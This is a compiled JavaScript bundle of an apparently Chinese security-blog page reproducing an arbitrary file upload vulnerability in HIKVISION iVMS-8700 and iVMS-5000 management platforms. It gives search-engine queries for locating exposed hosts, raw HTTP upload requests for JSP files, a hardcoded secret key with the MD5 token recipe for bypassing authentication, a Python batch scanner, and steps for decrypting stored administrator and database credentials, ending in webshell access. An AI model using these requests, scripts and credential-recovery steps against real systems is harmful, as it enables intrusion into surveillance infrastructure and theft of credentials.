"use strict";(self.webpackChunkmy_website=self.webpackChunkmy_website||[]).push([[4544],{3905:(e,n,t)=>{t.d(n,{Zo:()=>c,kt:()=>h});var r=t(7294);function a(e,n,t){return n in e?Object.defineProperty(e,n,{value:t,enumerable:!0,configurable:!0,writable:!0}):e[n]=t,e}function i(e,n){var t=Object.keys(e);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(e);n&&(r=r.filter((function(n){return Object.getOwnPropertyDescriptor(e,n).enumerable}))),t.push.apply(t,r)}return t}function o(e){for(var n=1;n<arguments.length;n++){var t=null!=arguments[n]?arguments[n]:{};n%2?i(Object(t),!0).forEach((function(n){a(e,n,t[n])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(t)):i(Object(t)).forEach((function(n){Object.defineProperty(e,n,Object.getOwnPropertyDescriptor(t,n))}))}return e}function p(e,n){if(null==e)return{};var t,r,a=function(e,n){if(null==e)return{};var t,r,a={},i=Object.keys(e);for(r=0;r<i.length;r++)t=i[r],n.indexOf(t)>=0||(a[t]=e[t]);return a}(e,n);if(Object.getOwnPropertySymbols){var i=Object.getOwnPropertySymbols(e);for(r=0;r<i.length;r++)t=i[r],n.indexOf(t)>=0||Object.prototype.propertyIsEnumerable.call(e,t)&&(a[t]=e[t])}return a}var l=r.createContext({}),s=function(e){var n=r.useContext(l),t=n;return e&&(t="function"==typeof e?e(n):o(o({},n),e)),t},c=function(e){var n=s(e.components);return r.createElement(l.Provider,{value:n},e.children)},u="mdxType",m={inlineCode:"code",wrapper:function(e){var n=e.children;return r.createElement(r.Fragment,{},n)}},d=r.forwardRef((function(e,n){var t=e.components,a=e.mdxType,i=e.originalType,l=e.parentName,c=p(e,["components","mdxType","originalType","parentName"]),u=s(t),d=a,h=u["".concat(l,".").concat(d)]||u[d]||m[d]||i;return t?r.createElement(h,o(o({ref:n},c),{},{components:t})):r.createElement(h,o({ref:n},c))}));function h(e,n){var t=arguments,a=n&&n.mdxType;if("string"==typeof e||a){var i=t.length,o=new Array(i);o[0]=d;var p={};for(var l in n)hasOwnProperty.call(n,l)&&(p[l]=n[l]);p.originalType=e,p[u]="string"==typeof e?e:a,o[1]=p;for(var s=2;s<i;s++)o[s]=t[s];return r.createElement.apply(null,o)}return r.createElement.apply(null,t)}d.displayName="MDXCreateElement"},9767:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>l,contentTitle:()=>o,default:()=>m,frontMatter:()=>i,metadata:()=>p,toc:()=>s});var r=t(7462),a=(t(7294),t(3905));const i={},o="\u6f0f\u6d1e\u63cf\u8ff0",p={unversionedId:"\u6f0f\u6d1e\u590d\u73b0/HIKVISION \u7efc\u5408\u5b89\u9632\u7ba1\u7406\u5e73\u53f0\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20",id:"\u6f0f\u6d1e\u590d\u73b0/HIKVISION \u7efc\u5408\u5b89\u9632\u7ba1\u7406\u5e73\u53f0\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20",title:"\u6f0f\u6d1e\u63cf\u8ff0",description:"HIKVISION \u7efc\u5408\u5b89\u9632\u7ba1\u7406\u5e73\u53f0\u5b58\u5728\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e\uff0c\u653b\u51fb\u8005\u901a\u8fc7\u83b7\u53d6\u5bc6\u94a5\u4efb\u610f\u6784\u9020token\uff0c\u8bf7\u6c42\u63a5\u53e3\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\uff0c\u5bfc\u81f4\u83b7\u53d6\u670d\u52a1\u5668webshell\u6743\u9650\uff0c\u540c\u65f6\u53ef\u8fdc\u7a0b\u8fdb\u884c\u6076\u610f\u4ee3\u7801\u6267\u884c\u3002",source:"@site/docs/\u6f0f\u6d1e\u590d\u73b0/HIKVISION \u7efc\u5408\u5b89\u9632\u7ba1\u7406\u5e73\u53f0\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20.md",sourceDirName:"\u6f0f\u6d1e\u590d\u73b0",slug:"/\u6f0f\u6d1e\u590d\u73b0/HIKVISION \u7efc\u5408\u5b89\u9632\u7ba1\u7406\u5e73\u53f0\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20",permalink:"/docs/\u6f0f\u6d1e\u590d\u73b0/HIKVISION \u7efc\u5408\u5b89\u9632\u7ba1\u7406\u5e73\u53f0\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20",draft:!1,editUrl:"https://github.com/Adm8n/Adm8n.github.io/tree/gh-pages/docs/\u6f0f\u6d1e\u590d\u73b0/HIKVISION \u7efc\u5408\u5b89\u9632\u7ba1\u7406\u5e73\u53f0\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20.md",tags:[],version:"current",frontMatter:{},sidebar:"tutorialSidebar",previous:{title:"65\u5185\u7f51\u6e17\u900f",permalink:"/docs/\u5c0f\u8fea\u5b89\u5168/65\u5185\u7f51\u6e17\u900f"},next:{title:"Redis \u672a\u6388\u6743\u8bbf\u95ee\u6e17\u900f\u4e4b\u65c5",permalink:"/docs/\u6f0f\u6d1e\u590d\u73b0/Redis \u672a\u6388\u6743\u8bbf\u95ee\u6e17\u900f\u4e4b\u65c5"}},l={},s=[{value:"\u4e00\u3001upload.action\u63a5\u53e3",id:"\u4e00uploadaction\u63a5\u53e3",level:3},{value:"\u4e8c\u3001/eps/api/resourceOperations/upload",id:"\u4e8cepsapiresourceoperationsupload",level:3},{value:"\u7b2c\u4e00\u79cd",id:"\u7b2c\u4e00\u79cd",level:4},{value:"\u7b2c\u4e8c\u79cd",id:"\u7b2c\u4e8c\u79cd",level:4}],c={toc:s},u="wrapper";function m(e){let{components:n,...t}=e;return(0,a.kt)(u,(0,r.Z)({},c,t,{components:n,mdxType:"MDXLayout"}),(0,a.kt)("h1",{id:"\u6f0f\u6d1e\u63cf\u8ff0"},"\u6f0f\u6d1e\u63cf\u8ff0"),(0,a.kt)("p",null,"HIKVISION \u7efc\u5408\u5b89\u9632\u7ba1\u7406\u5e73\u53f0\u5b58\u5728\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e\uff0c\u653b\u51fb\u8005\u901a\u8fc7\u83b7\u53d6\u5bc6\u94a5\u4efb\u610f\u6784\u9020token\uff0c\u8bf7\u6c42\u63a5\u53e3\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\uff0c\u5bfc\u81f4\u83b7\u53d6\u670d\u52a1\u5668webshell\u6743\u9650\uff0c\u540c\u65f6\u53ef\u8fdc\u7a0b\u8fdb\u884c\u6076\u610f\u4ee3\u7801\u6267\u884c\u3002"),(0,a.kt)("h1",{id:"\u6f0f\u6d1e\u5f71\u54cd"},"\u6f0f\u6d1e\u5f71\u54cd"),(0,a.kt)("ul",null,(0,a.kt)("li",{parentName:"ul"},"HIKVISION iVMS-8700\u7efc\u5408\u5b89\u9632\u7ba1\u7406\u5e73\u53f0"),(0,a.kt)("li",{parentName:"ul"},"HIKVISION iVMS-5000\u7efc\u5408\u5b89\u9632\u7ba1\u7406\u5e73\u53f0")),(0,a.kt)("h1",{id:"\u7f51\u7edc\u6d4b\u7ed8"},"\u7f51\u7edc\u6d4b\u7ed8"),(0,a.kt)("p",null,"fofa"),(0,a.kt)("ul",null,(0,a.kt)("li",{parentName:"ul"},'icon_hash="-911494769"'),(0,a.kt)("li",{parentName:"ul"},'web.body="/views/home/file/installPackage.rar"')),(0,a.kt)("p",null,'zoomeye\niconhash:-911494769 Banner:"/views/home/file/installPackage.rar" '),(0,a.kt)("h1",{id:"\u6f0f\u6d1e\u590d\u73b0"},"\u6f0f\u6d1e\u590d\u73b0"),(0,a.kt)("h3",{id:"\u4e00uploadaction\u63a5\u53e3"},"\u4e00\u3001upload.action\u63a5\u53e3"),(0,a.kt)("p",null,"\u767b\u5f55\u9875\u9762\n",(0,a.kt)("img",{parentName:"p",src:"https://s2.loli.net/2023/07/29/S3EApOf6PhdnvcI.png",alt:"\u767b\u5f55\u9875\u9762"}),"\n\u53d1\u9001\u8bf7\u6c42\u5305\u4e0a\u4f20"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-http"},"POST /eps/api/resourceOperations/upload HTTP/1.1\nHost: your-ip\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nAccept-Encoding: gzip, deflate\nReferer: http://you-ip\nConnection: close\nCookie: ISMS_8700_Sessionname=7634604FBE659A8532E666FE4AA41BE9\nUpgrade-Insecure-Requests: 1\nContent-Length: 62\n\nservice=http%3A%2F%2Fx.x.x.x%3Ax%2Fhome%2Findex.action\n")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-http"},'POST /eps/resourceOperations/upload.action HTTP/1.1\nHost: \nCache-Control: max-age=0\nUpgrade-Insecure-Requests: 1\nUser-Agent: MicroMessenger\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9\nCookie: ISMS_8700_Sessionname=CA0F207A6372FE883ACA78B74E6DC953; CAS-USERNAME=058; ISMS_8700_Sessionname=4D808BE7BE0E5C7047B9688E6009F710\nConnection: close\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryTJyhtTNqdMNLZLhj\nContent-Length: 212\n\n------WebKitFormBoundaryTJyhtTNqdMNLZLhj\nContent-Disposition: form-data; name="fileUploader";filename="test.jsp"\nContent-Type: image/jpeg\n\n<%out.print("hello");%>\n------WebKitFormBoundaryTJyhtTNqdMNLZLhj--\n')),(0,a.kt)("p",null,(0,a.kt)("img",{parentName:"p",src:"https://s2.loli.net/2023/07/29/nKZBtgS6cOjxwCv.png",alt:"image.png"}),"\n\u4e0a\u4f20\u8def\u5f84\n",(0,a.kt)("img",{parentName:"p",src:"https://s2.loli.net/2023/07/29/hoA1YEZwKckzfuO.png",alt:null})),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"/eps/upload/769badc8ef5944da804a4ca3c8ecafb0.jsp\n")),(0,a.kt)("p",null,(0,a.kt)("img",{parentName:"p",src:"https://s2.loli.net/2023/07/29/QAamhDNc3yzJMOZ.png",alt:null})),(0,a.kt)("h3",{id:"\u4e8cepsapiresourceoperationsupload"},"\u4e8c\u3001/eps/api/resourceOperations/upload"),(0,a.kt)("p",null,"bp\u6293\u53d6\u9996\u9875\u5305\uff0c\u5c1d\u8bd5\u8bbf\u95ee\u63a5\u53e3\uff08\u53d1\u73b0token\u9700\u8981\u8fdb\u884c\u9274\u6743\uff09\n",(0,a.kt)("img",{parentName:"p",src:"https://s2.loli.net/2023/07/29/xD7XRnitZsmlr8e.png",alt:null})),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-http"},"POST /eps/api/resourceOperations/upload HTTP/1.1\nHost: your-ip\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nAccept-Encoding: gzip, deflate\nReferer: http://you-ip\nConnection: close\nCookie: ISMS_8700_Sessionname=7634604FBE659A8532E666FE4AA41BE9\nUpgrade-Insecure-Requests: 1\nContent-Length: 62\n\nservice=http%3A%2F%2Fx.x.x.x%3Ax%2Fhome%2Findex.action\n")),(0,a.kt)("p",null,"\u901a\u8fc7\u6784\u9020token\u7ed5\u8fc7\u8ba4\u8bc1\uff08\u5185\u90e8\u673a\u5236\uff1a\u5982\u679ctoken\u503c\u4e0e\u8bf7\u6c42url+secretkey\u7684md5\u503c\u76f8\u540c\u5c31\u53ef\u4ee5\u7ed5\u8fc7\u8ba4\u8bc1\uff09\nsecretkey\u662f\u4ee3\u7801\u91cc\u5199\u6b7b\u7684\uff08\u9ed8\u8ba4\u503c\uff1asecretKeyIbuilding\uff09\ntoken\u503c\u9700\u8981\u8fdb\u884cMD5\u52a0\u5bc6\uff0832\u4f4d\u5927\u5199\uff09\n\u7ec4\u5408\uff1atoken=md5(http://url/eps/api/resourceOperations/uploadsecretKeyIbuilding)\n\u5229\u7528\u5728\u7ebf\u7f51\u7ad9\u6784\u9020\uff1a",(0,a.kt)("a",{parentName:"p",href:"https://www.sojson.com/encrypt_md5.html"},"https://www.sojson.com/encrypt_md5.html"),"\n",(0,a.kt)("img",{parentName:"p",src:"https://s2.loli.net/2023/07/29/Gap7nWXvUhMki4J.png",alt:null}),"\n\u7136\u540e\u5229\u752832\u4f4d\u7684md5\u89e3\u5bc6\u7684token\uff0c\u518d\u6b21\u5c1d\u8bd5\n",(0,a.kt)("img",{parentName:"p",src:"https://s2.loli.net/2023/07/29/EgUcLhlIjRx1Ftf.png",alt:null}),"\n\u770b\u5230bp\u8fd4\u56de\u5305\uff0c\u6210\u529f\u7ed5\u8fc7\u3002\u63a5\u4e0b\u6765\uff0c\u5c31\u53ef\u4ee5\u6784\u9020webshell\uff0c\u8fdb\u884c\u4e0a\u4f20\u3002"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-http"},'POST /eps/api/resourceOperations/upload?token=\u6784\u9020\u7684token\u503c HTTP/1.1\nHost: your-ip\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nConnection: close\nCookie: ISMS_8700_Sessionname=A29E70BEA1FDA82E2CF0805C3A389988\nContent-Type: multipart/form-data;boundary=----WebKitFormBoundaryGEJwiloiPo\nUpgrade-Insecure-Requests: 1\nContent-Length: 174\n\n------WebKitFormBoundaryGEJwiloiPo\nContent-Disposition: form-data; name="fileUploader";filename="1.jsp"\nContent-Type: image/jpeg\n\ntest\n------WebKitFormBoundaryGEJwiloiPo\n')),(0,a.kt)("p",null,"\u51b0\u874e\u6210\u529f\u8fde\u63a5\n",(0,a.kt)("img",{parentName:"p",src:"https://s2.loli.net/2023/07/29/KDzAasxiSY2qZ34.png",alt:null})),(0,a.kt)("h1",{id:"\u6f0f\u6d1epoc"},"\u6f0f\u6d1ePOC"),(0,a.kt)("ul",null,(0,a.kt)("li",{parentName:"ul"},(0,a.kt)("a",{parentName:"li",href:"https://github.com/sccmdaveli/hikvision-poc"},"https://github.com/sccmdaveli/hikvision-poc")),(0,a.kt)("li",{parentName:"ul"})),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},'import requests\nimport urllib3\nimport urllib\nimport hashlib\nimport argparse\nfrom colorama import init\nfrom colorama import Fore\ninit(autoreset=True)\nurllib3.disable_warnings()\n\n\nhead = {\n    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",\n    "Cookie": "ISMS_8700_Sessionname=ABCB193BD9D82CC2D6094F6ED4D81169"\n}\ndef md5encode(url):\n    if url.endswith("/"):\n        path = "eps/api/resourceOperations/uploadsecretKeyIbuilding"\n    else:\n        path = "/eps/api/resourceOperations/uploadsecretKeyIbuilding"\n    encodetext = url + path\n    input_name = hashlib.md5()\n    input_name.update(encodetext.encode("utf-8"))\n    return (input_name.hexdigest()).upper()\n\ndef poc(url):\n    if url.endswith("/"):\n        path = "eps/api/resourceOperations/upload?token="\n    else:\n        path = "/eps/api/resourceOperations/upload?token="\n    pocurl = url + path + md5encode(url)\n    data = {\n        "service": urllib.parse.quote(url + "/home/index.action")\n    }\n    try:\n        response = requests.post(url=pocurl,headers=head,data=data,verify=False,timeout=3)\n        if response.status_code==200:\n            print(Fore.GREEN + f"[+]{url}\u5b58\u5728\u6d77\u5eb7\u5a01\u89c6iVMS \u7efc\u5408\u5b89\u9632\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e\uff01\uff01\uff01\uff01")\n        else:\n            print(Fore.RED + f"[-]{url}\u4e0d\u5b58\u5728\u6d77\u5eb7\u5a01\u89c6iVMS \u7efc\u5408\u5b89\u9632\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e")\n    except:\n        pass\n\nif __name__ == \'__main__\':\n    parser = argparse.ArgumentParser(usage=\'python3 ivms.py -u http://xxxx\\npython3 ivms.py -f file.txt\',\n                                     description=\'ivms\u6f0f\u6d1e\u68c0\u6d4bpoc\',\n                                     )\n    p = parser.add_argument_group(\'ivms \u7684\u53c2\u6570\')\n    p.add_argument("-u", "--url", type=str, help="\u6d4b\u8bd5\u5355\u6761url")\n    p.add_argument("-f", "--file", type=str, help="\u6d4b\u8bd5\u591a\u4e2aurl\u6587\u4ef6")\n    args = parser.parse_args()\n    if args.url:\n        poc(args.url)\n    if args.file:\n        for i in open(args.file,"r").read().split("\\n"):\n            poc(i)\n')),(0,a.kt)("h1",{id:"\u89e3\u5bc6\u5de5\u5177"},"\u89e3\u5bc6\u5de5\u5177"),(0,a.kt)("p",null,"\u4e00\u5171\u6709\u4e24\u79cd\uff1a"),(0,a.kt)("h4",{id:"\u7b2c\u4e00\u79cd"},"\u7b2c\u4e00\u79cd"),(0,a.kt)("ul",null,(0,a.kt)("li",{parentName:"ul"},(0,a.kt)("a",{parentName:"li",href:"https://github.com/wafinfo/Hikvision"},"https://github.com/wafinfo/Hikvision"))),(0,a.kt)("p",null,"\u76f4\u63a5\u8fd0\u884cHikvision.jar\u8f93\u51fa\u66ff\u6362sysadmin\u7528\u6237password\u548csalt\u3002\n",(0,a.kt)("img",{parentName:"p",src:"https://s2.loli.net/2023/07/29/zGtY57OCDrBelHM.png",alt:null}),"\n",(0,a.kt)("img",{parentName:"p",src:"https://s2.loli.net/2023/07/29/DJwNUYfcZoELBtK.png",alt:null})),(0,a.kt)("h4",{id:"\u7b2c\u4e8c\u79cd"},"\u7b2c\u4e8c\u79cd"),(0,a.kt)("ul",null,(0,a.kt)("li",{parentName:"ul"},(0,a.kt)("a",{parentName:"li",href:"https://github.com/baogod404/HikvisionDecode"},"https://github.com/baogod404/HikvisionDecode"))),(0,a.kt)("p",null,"\u6570\u636e\u5e93\u6587\u4ef6\u4f4d\u7f6e\uff1a\nProgram Files (x86)/SurveillanceSystem/CMS/webserver/Tomcat/webapps/eps/WEB-INF/classes/constants.properties\n",(0,a.kt)("img",{parentName:"p",src:"https://s2.loli.net/2023/07/29/ZziF2mCT1a6kGI9.png",alt:null}),"\n\u7136\u540ejava -jar HikvisionDecode-1.0-SNAPSHOT.jar xxxxx \u8f93\u5165\u52a0\u5bc6\u7684\u8d26\u53f7\u548c\u5bc6\u7801\uff0c\u5982\u56fe:\n",(0,a.kt)("img",{parentName:"p",src:"https://s2.loli.net/2023/07/29/jKwhD8CI9znQvcV.png",alt:null})))}m.isMDXComponent=!0}}]);